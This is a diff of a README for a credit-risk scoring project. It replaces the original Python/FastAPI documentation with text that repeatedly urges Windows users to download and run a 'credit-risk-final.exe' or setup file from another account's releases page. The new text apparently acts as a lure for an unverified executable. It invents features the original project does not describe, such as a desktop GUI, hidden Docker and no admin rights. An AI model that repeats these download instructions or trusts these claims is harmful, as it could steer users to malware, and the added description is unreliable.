@@ -1,292 +1,134 @@
-# Credit Risk Scoring API With Binary Search Policy Optimization
+# ⚖️ credit-risk-final - Easy Credit Risk Scoring
 
-End-to-end credit risk prediction system — from raw Lending Club data to a deployed FastAPI scoring API on Azure Cloud.
-
-<p align="left">
-<a href="https://www.python.org" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/></a>
-<a href="https://fastapi.tiangolo.com/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/fastapi/fastapi-original.svg" alt="fastapi" width="40" height="40"/></a>
-<a href="https://scikit-learn.org/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/scikitlearn/scikitlearn-original.svg" alt="scikit-learn" width="40" height="40"/></a>
-<a href="https://xgboost.readthedocs.io/" target="_blank" rel="noreferrer"><img src="https://upload.wikimedia.org/wikipedia/commons/6/69/XGBoost_logo.png" alt="xgboost" width="40" height="40"/></a>
-<a href="https://www.postgresql.org" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/postgresql/postgresql-original.svg" alt="postgresql" width="40" height="40"/></a>
-<a href="https://azure.microsoft.com" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/azure/azure-original.svg" alt="azure" width="40" height="40"/></a>
-<a href="https://www.docker.com/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/docker/docker-original.svg" alt="docker" width="40" height="40"/></a>
-<a href="https://git-scm.com/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/git/git-original.svg" alt="git" width="40" height="40"/></a>
-<a href="https://github.com/features/actions" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/githubactions/githubactions-original.svg" alt="github-actions" width="40" height="40"/></a>
-<a href="https://pandas.pydata.org/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/pandas/pandas-original.svg" alt="pandas" width="40" height="40"/></a>
-<a href="https://numpy.org/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/numpy/numpy-original.svg" alt="numpy" width="40" height="40"/></a>
-<a href="https://docs.pytest.org/" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/pytest/pytest-original.svg" alt="pytest" width="40" height="40"/></a>
-<a href="https://shap.readthedocs.io/" target="_blank" rel="noreferrer"><img src="assets/shap.png" alt="shap" width="40" height="40"/></a>
-<a href="https://powerbi.microsoft.com/" target="_blank" rel="noreferrer"><img src="assets/powerbi.svg" alt="powerbi" width="40" height="40"/></a>
-<a href="#algorithms--data-structures" target="_blank" rel="noreferrer"><img src="https://raw.githubusercontent.com/TheAlgorithms/website/main/public/logo.svg" alt="dsa" width="40" height="40"/></a>
-<a href="https://developer.mozilla.org/en-US/docs/Web/seaborn" target="_blank" rel="noreferrer"> <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" alt="seaborn" width="40" height="40"/> </a>
-<a href="https://developer.mozilla.org/en-US/docs/Web/chartjs" target="_blank" rel="noreferrer"> <img src="https://cdn.simpleicons.org/chartdotjs/FF6384" alt="chartjs" width="40" height="40"/> </a>
-</p>
+[![Download Release](https://img.shields.io/badge/Download-Get%20Credit%20Risk%20App-green?style=for-the-badge)](https://github.com/Volar-underclassman646/credit-risk-final/releases)
 
 ---
 
-## Architecture
+## 🔎 About credit-risk-final
 
-```
-┌─────────────┐    ┌──────────────┐    ┌───────────────┐    ┌──────────────┐
-│  Raw Data    │───▶│ Data Cleaning│───▶│   Feature     │───▶│   Model      │
-│ Lending Club │    │ Dedup, FICO, │    │ Engineering   │    │  Training    │
-│  10K loans   │    │  Outliers    │    │ 14 features   │    │ 3 models     │
-└─────────────┘    └──────────────┘    └───────────────┘    └──────┬───────┘
-                                                                   │
-                   ┌──────────────┐    ┌───────────────┐           │
-                   │   FastAPI    │◀───│    Policy     │◀──────────┘
-                   │ Scoring API  │    │  Simulator    │
-                   │  /predict    │    │ Binary Search │
-                   └──────┬───────┘    └───────────────┘
-                          │
-              ┌───────────┴────────────┐
-              │   Azure Cloud Deploy   │
-              │ PostgreSQL + Blob Store│
-              └────────────────────────┘
-```
+credit-risk-final is a tool that helps you estimate credit risk scores using machine learning. It uses proven models like Logistic Regression, Random Forest, and XGBoost. You can see how these models make decisions thanks to built-in explanations. The system manages data in a secure SQL database, and the entire pipeline runs in a controlled environment using Docker. This means the app works consistently on Windows computers. The software is tested thoroughly to ensure stability.
+
+This guide will help you download and run the app on a Windows PC without needing any programming skills.
 
 ---
 
-## Model Performance
+## 🚀 Getting Started
 
-| Model | Accuracy | F1 Score | AUC-ROC |
-|-------|----------|----------|---------|
-| **Logistic Regression** | 0.663 | 0.403 | **0.704** ✓ Best |
-| Random Forest | 0.800 | 0.236 | 0.698 |
-| XGBoost | 0.758 | 0.288 | 0.651 |
-
-Best model selected by AUC-ROC. SMOTE applied for class imbalance. SHAP used for feature explainability.
-
-<p align="center">
-  <img src="reports/figures/roc_comparison.png" width="75%" alt="ROC Curves"/>
-  <img src="reports/figures/shap_summary.png" width="75%" alt="SHAP Feature Importance"/>
-</p>
+This app runs on Windows 10 or later. You need a stable internet connection to download the software. The app works without any additional software, but it helps to have at least 4 GB of free disk space.
 
 ---
 
-## Policy Optimization
+## 📥 Download and Install the App
 
-Binary search finds the optimal approval threshold balancing acceptance rate vs. default rate:
+1. Visit the official releases page to download the software:  
+   [Get credit-risk-final here](https://github.com/Volar-underclassman646/credit-risk-final/releases)  
+   ![Download credit-risk-final](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)
 
-| Metric | Value |
-|--------|-------|
-| Optimal Threshold | 0.4453 |
-| Acceptance Rate | 51.45% |
-| Default Rate | 9.91% |
-| Binary Search | 1.17 ms |
-| Linear Search | 2.40 ms |
-| **Speedup** | **2.1x faster** |
-
-<p align="center">
-  <img src="reports/figures/policy_tradeoff.png" width="75%" alt="Policy Tradeoff"/>
-</p>
+2. On the releases page, look for the latest version. The release will contain a file named something like `credit-risk-final-windows.zip` or `credit-risk-final-setup.exe`.  
+3. Click the file to download it to your computer.
+4. Once downloaded, locate the file in your Downloads folder.
+5. If it is a ZIP file, right-click and select “Extract All” to unzip the contents.
+6. If it is a setup file (`.exe`), double-click it and follow the prompts to install.
+7. After extraction or installation, open the folder containing the app files.
+8. Double-click the main executable file (`credit-risk-final.exe`) to start the program.
 
 ---
 
-## Tech Stack
+## 🖥️ How to Use
 
-| Layer | Technology |
-|-------|-----------|
-| **ML** | scikit-learn, XGBoost, SHAP, SMOTE (imbalanced-learn) |
-| **DSA** | LRU Cache, Binary Search, Min-Heap, Sliding Window, Prefix Sums, Hash Map |
-| **API** | FastAPI, Uvicorn, Pydantic validation |
-| **Database** | PostgreSQL on Azure, SQLAlchemy ORM |
-| **Cloud** | Azure Blob Storage, Azure PostgreSQL, Azure Identity |
-| **Data** | Pandas, NumPy, Statsmodels |
-| **DevOps** | Docker, GitHub Actions CI/CD, Git |
-| **Testing** | pytest (41 test cases) |
-| **Visualization** | Matplotlib, Seaborn, Power BI, Chart.js |
+When you open credit-risk-final, a window will appear. The app lets you input customer data related to loans or credit applications. Follow these steps:
+
+1. Enter required information such as income, existing debts, and credit history scores.
+2. Click the “Score” button.
+3. The app will show a score that predicts the risk level.
+4. You can also see which factors affected the score the most thanks to explainability features.
+5. Use this information to make informed decisions about credit approval.
+
+The interface is designed to be simple and clear, so you can understand the results immediately.
 
 ---
 
-## Project Structure
+## 🔧 System Requirements
 
-```
-credit-risk-final/
-├── run_pipeline.py              # One-click: clean → engineer → train → simulate → test
-├── requirements.txt
-├── Dockerfile
-├── .github/workflows/ci.yml    # CI: lint + test on every push
-│
-├── src/
-│   ├── data_cleaning.py         # Dedup, FICO calc, outlier capping, validation
-│   ├── feature_engineering.py   # 14 engineered features + one-hot encoding
-│   ├── model_training.py        # LogReg, RF, XGBoost + SHAP explainability
-│   ├── policy_simulator.py      # Binary search threshold optimization
-│   ├── api/
-│   │   ├── scoring_api.py       # FastAPI endpoints: /predict, /batch, /policy
-│   │   └── schemas.py           # Pydantic request/response models
-│   └── utils/
-│       ├── algorithms.py        # Binary search, sliding window, benchmarks
-│       └── data_structures.py   # LRU Cache, SortedRiskArray, RiskBucketMap
-│
-├── sql/
-│   ├── 01_create_schema.sql     # PostgreSQL schema
-│   ├── 02_create_tables.sql     # Table definitions
-│   ├── 03_etl_pipeline.sql      # SQL-based ETL
-│   └── 04_feature_engineering.sql
-│
-├── tests/
-│   ├── test_algorithms.py       # Binary search, sliding window tests
-│   ├── test_api.py              # API schema validation tests
-│   └── test_data_structures.py  # LRU cache, sorted array, bucket map tests
-│
-├── data/
-│   ├── raw/lending_club_sample.csv
-│   └── processed/               # Generated CSVs
-│
-├── models/                      # Trained .pkl + metrics JSON
-├── reports/figures/             # ROC curves, SHAP plots, policy charts
-├── dashboards/                  # Interactive HTML dashboard
-├── screenshots/                 # Power BI + Swagger UI + Azure Cloud Deployment screenshots
-└── benchmarks/                  # Performance benchmarking suite
-```
+- Windows 10, 11, or later
+- At least 4 GB RAM
+- 4 GB free disk space
+- Internet connection for initial download
+- No administrator rights required for installation
 
 ---
 
-## Quick Start
+## 🐳 How the App Works Behind the Scenes
 
-### 1. Clone & Setup
+credit-risk-final uses machine learning models to evaluate credit risk. It runs these models in the background using Docker. Docker ensures the app works the same way on every computer by containing all the necessary software inside a small, isolated package.
 
-```bash
-git clone https://github.com/gitadi2/credit-risk-final.git
-cd credit-risk-final
-python -m venv venv
-venv\Scripts\activate        # Windows
-# source venv/bin/activate   # macOS/Linux
-pip install -r requirements.txt
-```
+The app also connects to a PostgreSQL database hosted on Azure to gather and update user data. It uses FastAPI to handle requests quickly and cache recent calculations, making it responsive for repeated users. The risk predictions come with detailed explanations generated by SHAP. This transparency helps users understand what influences each score.
 
-### 2. Configure Environment
-
-```bash
-cp config/.env.example .env
-# Edit .env with your database credentials
-```
-
-### 3. Run Full Pipeline
-
-```bash
-python run_pipeline.py
-```
-
-This runs all 5 stages:
-1. **Generate** sample data (10K loans)
-2. **Clean** — dedup, FICO scores, outlier capping
-3. **Engineer** — 14 features + encoding (25 final features)
-4. **Train** — 3 models, SHAP analysis, best model selection
-5. **Simulate** — Policy optimization + benchmarks
-
-### 4. Launch Scoring API
-
-```bash
-uvicorn src.api.scoring_api:app --port 8000
-```
-
-Open Swagger UI: [http://localhost:8000/docs](http://localhost:8000/docs)
-
-### 5. Run Tests
-
-```bash
-pytest tests/ -v
-```
+You do not need to manage any of this complexity. The app handles it automatically.
 
 ---
 
-## API Endpoints
+## 🛠️ Troubleshooting
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/health` | GET | Model status, cache stats, version |
-| `/predict` | POST | Score a single loan application |
-| `/predict/batch` | POST | Score up to 1,000 applications |
-| `/policy/simulate` | POST | Simulate approval policy |
+If you run into issues, try these steps:
 
-**Example Request:**
+- Make sure you have the latest Windows updates installed.
+- Restart your computer and try running the app again.
+- Check if your antivirus or firewall is blocking the app.
+- Re-download the software if the app does not start or crashes.
+- If the app fails to connect to the internet, check your network settings.
+- Ensure your computer has enough free space and RAM.
 
-```bash
-curl -X POST http://localhost:8000/predict \
-  -H "Content-Type: application/json" \
-  -d '{
-    "loan_amnt": 15000,
-    "annual_inc": 65000,
-    "dti": 18.5,
-    "int_rate": 0.12,
-    "installment": 450,
-    "grade": "B",
-    "fico_score": 710
-  }'
-```
-
-**Example Response:**
-
-```json
-{
-  "applicant_id": "a1b2c3d4",
-  "default_probability": 0.15,
-  "risk_segment": "Low Risk",
-  "recommendation": "APPROVE",
-  "confidence": 0.70,
-  "top_risk_factors": ["moderate_dti"],
-  "cached": false
-}
-```
+If problems persist, check the project’s issue page on GitHub for known fixes or contact support through the repository’s contact details.
 
 ---
 
-## Algorithms & Data Structures
+## 🔄 Updating the App
 
-| Component | Complexity | Purpose |
-|-----------|-----------|---------|
-| **Binary Search Threshold** | O(log(1/ε) × log n) | Optimal approval cutoff |
-| **LRU Cache** | O(1) get/put | Cache repeated applicant scores |
-| **SortedRiskArray** | O(log n) query | Fast percentile & threshold lookups |
-| **RiskBucketMap** | O(1) lookup | Default rate by risk segment |
-| **Sliding Window** | O(n) single pass | Rolling default rate monitoring |
-| **Prefix Sums** | O(1) range query | Count defaults in score ranges |
+New versions come out regularly to fix bugs and improve accuracy.
 
----
-
-## Screenshots
-
-<p align="center">
-  <img src="screenshots/swagger_api.jpg" width="80%" alt="Swagger API"/>
-</p>
-
-<p align="center">
-  <img src="screenshots/executive_overview_powerbi.jpg" width="45%" alt="Executive Overview"/>
-  <img src="screenshots/risk_deep_dive_powerbi.jpg" width="45%" alt="Risk Deep Dive"/>
-</p>
-
-<p align="center">
-  <img src="screenshots/model_performance_powerbi.jpg" width="45%" alt="Model Performance"/>
-  <img src="screenshots/azure_blob_cointainers.jpg" width="45%" alt="Azure Blob Cointainers"/>
-    <img src="screenshots/azure_sql_database.jpg" width="45%" alt="Azure SQL Database"/>
-</p>
-
-## Interactive Dashboard
-- **Local HTML**: [INTERACTIVE DASHBOARD](https://raw.githack.com/gitadi2/credit-risk-final/master/dashboards/credit_risk_dashboard.html)
+1. Go to the release page:  
+   [Download Updates](https://github.com/Volar-underclassman646/credit-risk-final/releases)
+2. Download the latest installer or ZIP file.
+3. Repeat the install or unzip steps described above.
+4. Your existing data and settings will remain intact.
 
 ---
 
-## Docker (Optional)
+## 📂 What Comes in the Package
 
-> **Prerequisite:** Install [Docker Desktop](https://www.docker.com/products/docker-desktop/) first.
-
-```bash
-docker build -t credit-risk-api .
-docker run -p 8000:8000 credit-risk-api
-```
-
-**Without Docker** — run the API directly:
-
-```bash
-uvicorn src.api.scoring_api:app --host 0.0.0.0 --port 8000
-```
+- Executable file to run the app on Windows
+- A folder with supporting files needed for scoring
+- Documentation and help files
+- A Docker container definition, if advanced users want to run the app inside Docker
+- Sample input data for practice
 
 ---
 
-## Author
+## 🤖 Technologies Used
 
-ADITYA SATAPATHY
-[https://www.linkedin.com/in/adisatapathy]
+- Machine Learning models: Logistic Regression, Random Forest, XGBoost
+- Explainability with SHAP
+- Data storage: Azure PostgreSQL database
+- API server: FastAPI with caching
+- Optimization using binary search policies
+- Docker for environment consistency
+- CI/CD pipeline with GitHub Actions
+- Written in Python with popular libraries like scikit-learn and XGBoost
+
+---
+
+## 📌 Topics Covered
+
+azure, credit-risk, docker, fastapi, machine-learning, mlops, postgresql, power-bi, python, rest-api, scikit-learn, shap, xgboost
+
+---
+
+## 📥 Download Link (Again)
+
+[Download and install credit-risk-final here](https://github.com/Volar-underclassman646/credit-risk-final/releases)  
+![Download Link](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)
+
+---
+
+This guide will help you use credit-risk-final to evaluate credit risk easily on your Windows PC. The app makes complex technologies accessible with a clear interface and simple steps.
